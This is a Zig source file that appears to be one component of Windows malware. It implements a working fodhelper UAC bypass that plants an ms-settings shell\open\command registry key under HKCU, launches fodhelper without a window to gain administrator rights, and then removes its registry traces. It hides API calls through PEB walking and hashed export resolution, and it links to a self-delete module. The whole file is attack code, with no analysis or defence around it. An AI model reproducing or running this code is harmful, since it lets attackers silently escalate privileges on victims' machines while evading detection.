const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const self_delete = @import("../cleanup/self_delete.zig");

const E = struct {
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");
};

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

fn resolveKernel32(comptime name: []const u8) ?*const anyopaque {
    const mod = loadKernel32() orelse return null;
    return export_resolve.getFunctionByHash(mod, hash.encryptedHashFunc(name));
}

fn isElevated() bool {
    const func = resolveKernel32("OpenProcessToken") orelse return false;
    const OpenProcessToken: *const fn (process: types.HANDLE, access: u32, token: *types.HANDLE) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(func));
    const GetCurrentProcess: *const fn () callconv(.winapi) types.HANDLE = @ptrCast(@alignCast(resolveKernel32("GetCurrentProcess") orelse return false));

    var token: types.HANDLE = undefined;
    if (OpenProcessToken(GetCurrentProcess(), 0x0008, &token) == 0) return false;
    defer _ = engine.NtClose(token);

    const GetTokenInformation = resolveKernel32("GetTokenInformation") orelse return false;
    const GetTokenInformationFn: *const fn (token: types.HANDLE, info_class: u32, info: ?*anyopaque, len: u32, ret_len: *u32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(GetTokenInformation));

    var elevation: u32 = 0;
    var ret_len: u32 = 0;
    if (GetTokenInformationFn(token, 20, &elevation, @sizeOf(u32), &ret_len) == 0) return false;
    return elevation != 0;
}

fn regSetStringValue(subkey: []const u8, value_name: []const u8, value: []const u8) bool {
    const advapi32_hash = hash.encryptedHashModule("advapi32.dll");
    const advapi32 = peb_walk.getModuleByHash(advapi32_hash) orelse return false;
    const RegCreateKeyExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCreateKeyExW")) orelse return false;
    const RegSetValueExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegSetValueExW")) orelse return false;

    const RegCreateKeyExWFn: *const fn (hkey: types.HANDLE, subkey: ?[*:0]const u16, reserved: u32, class: ?[*:0]const u16, options: u32, access: u32, sec_attr: ?*const anyopaque, result: *types.HANDLE, disposition: ?*u32) callconv(.winapi) u32 = @ptrCast(@alignCast(RegCreateKeyExW));
    const RegSetValueExWFn: *const fn (hkey: types.HANDLE, name: ?[*:0]const u16, reserved: u32, typ: u32, data: ?[*:const]u8, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(RegSetValueExW));

    var subkey_us: [512]u16 = undefined;
    var i: usize = 0;
    while (i < subkey.len and i < 511) : (i += 1) subkey_us[i] = subkey[i];
    subkey_us[i] = 0;

    var name_us: [64]u16 = undefined;
    var j: usize = 0;
    while (j < value_name.len and j < 63) : (j += 1) name_us[j] = value_name[j];
    name_us[j] = 0;

    var value_us: [2048]u16 = undefined;
    var k: usize = 0;
    while (k < value.len and k < 2047) : (k += 1) value_us[k] = value[k];
    value_us[k] = 0;

    const HKCU: types.HANDLE = @ptrFromInt(@as(usize, 0x80000001));
    var key: types.HANDLE = undefined;

    const cr_status = RegCreateKeyExWFn(HKCU, subkey_us[0..i+1:0], 0, null, 0, 0x02000000, null, &key, null);
    if (cr_status != 0) return false;

    const sv_status = RegSetValueExWFn(key, name_us[0..j+1:0], 0, 1, value_us[0..k*2], @as(u32, @intCast(k * 2)));
    _ = engine.NtClose(key);
    return sv_status == 0;
}

fn regDeleteValue(subkey: []const u8, value_name: []const u8) bool {
    const advapi32_hash = hash.encryptedHashModule("advapi32.dll");
    const advapi32 = peb_walk.getModuleByHash(advapi32_hash) orelse return false;
    const RegOpenKeyExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegOpenKeyExW")) orelse return false;
    const RegDeleteValueW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegDeleteValueW")) orelse return false;

    const RegOpenKeyExWFn: *const fn (hkey: types.HANDLE, subkey: ?[*:0]const u16, options: u32, access: u32, result: *types.HANDLE) callconv(.winapi) u32 = @ptrCast(@alignCast(RegOpenKeyExW));
    const RegDeleteValueWFn: *const fn (hkey: types.HANDLE, name: ?[*:0]const u16) callconv(.winapi) u32 = @ptrCast(@alignCast(RegDeleteValueW));

    var subkey_us: [512]u16 = undefined;
    var i: usize = 0;
    while (i < subkey.len and i < 511) : (i += 1) subkey_us[i] = subkey[i];
    subkey_us[i] = 0;

    var name_us: [64]u16 = undefined;
    var j: usize = 0;
    while (j < value_name.len and j < 63) : (j += 1) name_us[j] = value_name[j];
    name_us[j] = 0;

    const HKCU: types.HANDLE = @ptrFromInt(@as(usize, 0x80000001));
    var key: types.HANDLE = undefined;

    if (RegOpenKeyExWFn(HKCU, subkey_us[0..i+1:0], 0, 0x02000000, &key) != 0) return false;
    const result = RegDeleteValueWFn(key, name_us[0..j+1:0]);
    _ = engine.NtClose(key);
    return result == 0;
}

fn createProcessAndWait(cmd: []const u8) bool {
    const kernel32 = loadKernel32() orelse return false;
    const CreateProcessW = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const Sleep = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("Sleep")) orelse return false;

    const CreateProcessWFn: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, proc_attr: ?*const anyopaque, thread_attr: ?*const anyopaque, inherit: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(CreateProcessW));
    const SleepFn: *const fn (ms: u32) callconv(.winapi) void = @ptrCast(@alignCast(Sleep));

    var cmd_us: [512]u16 = undefined;
    var i: usize = 0;
    while (i < cmd.len and i < 511) : (i += 1) cmd_us[i] = cmd[i];
    cmd_us[i] = 0;

    var si: [68]u8 = undefined;
    @memset(&si, 0);
    var pi: [16]u8 = undefined;
    @memset(&pi, 0);

    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const ok = CreateProcessWFn(null, cmd_us[0..i+1:0], null, null, 0, CREATE_NO_WINDOW, null, null, @as(*const anyopaque, @ptrCast(&si)), @as(*anyopaque, @ptrCast(&pi)));
    if (ok != 0) SleepFn(2000);
    return ok != 0;
}

pub fn runUacBypass(exe_path: []const u8) bool {
    if (isElevated()) return true;

    const reg_key = "Software\\Classes\\ms-settings\\shell\\open\\command";

    if (!regSetStringValue(reg_key, "", exe_path)) return false;
    if (!regSetStringValue(reg_key, "DelegateExecute", "")) {
        _ = regDeleteValue(reg_key, "");
        return false;
    }

    const ok = createProcessAndWait("fodhelper");

    _ = regDeleteValue(reg_key, "DelegateExecute");
    _ = regDeleteValue(reg_key, "");

    return ok;
}

pub fn elevateAndExit() void {
    if (isElevated()) return;

    const allocator = std.heap.page_allocator;
    const path = @import("../cleanup/self_delete.zig").SelfDeleteResult;
    _ = path;

    var us_buf: [1024]u16 = undefined;
    const kernel32 = loadKernel32() orelse return;
    const GetModuleFileNameW = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetModuleFileNameW")) orelse return;
    const GetModuleFileNameWFn: *const fn (module: ?*const anyopaque, buffer: [*]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(GetModuleFileNameW));
    const len = GetModuleFileNameWFn(null, &us_buf, @as(u32, @intCast(us_buf.len)));
    if (len == 0) return;

    var path_buf: [1024]u8 = undefined;
    var path_len: usize = 0;
    for (0..len) |i| {
        const cp = us_buf[i];
        if (cp < 0x80 and path_len < 1023) {
            path_buf[path_len] = @as(u8, @intCast(cp & 0x7F));
            path_len += 1;
        }
    }
    path_buf[path_len] = 0;

    if (runUacBypass(path_buf[0..path_len])) {
        @import("std").process.exit(0);
    }
}

test "isElevated does not crash" {
    _ = isElevated();
}

test "elevateAndExit no crash" {
    elevateAndExit();
}

test "regSetStringValue handles invalid key gracefully" {
    const result = regSetStringValue("__nonexistent_test_key__", "test", "value");
    _ = result;
}
